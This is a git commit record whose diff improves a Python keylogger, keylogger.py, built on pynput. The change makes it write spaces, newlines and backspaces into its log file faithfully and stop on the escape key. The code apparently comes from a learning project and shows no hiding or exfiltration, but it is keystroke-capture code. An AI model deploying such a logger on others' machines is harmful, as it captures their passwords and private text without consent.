3de093a9bf11d79b7c60d0926a00107cba60c348
Josh Philip <jphilip3804@gmail.com>
2024-03-20 10:16:08 -0400

    added extra functionality

--- keylogger.py
+++ keylogger.py
@@ -8,7 +8,17 @@ def keyPressed(key):
             char = key.char
             logKey.write(char)
         except:
-            print("Error getting char")
+            if key == keyboard.Key.space:
+                logKey.write(" ")
+            elif key == keyboard.Key.enter:
+                logKey.write("\n")
+            elif key == keyboard.Key.backspace:
+                logKey.seek(logKey.tell()-1, 0)
+                logKey.truncate()
+            elif key == keyboard.Key.esc:
+                return False
+            else:
+                print("Error getting char")
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
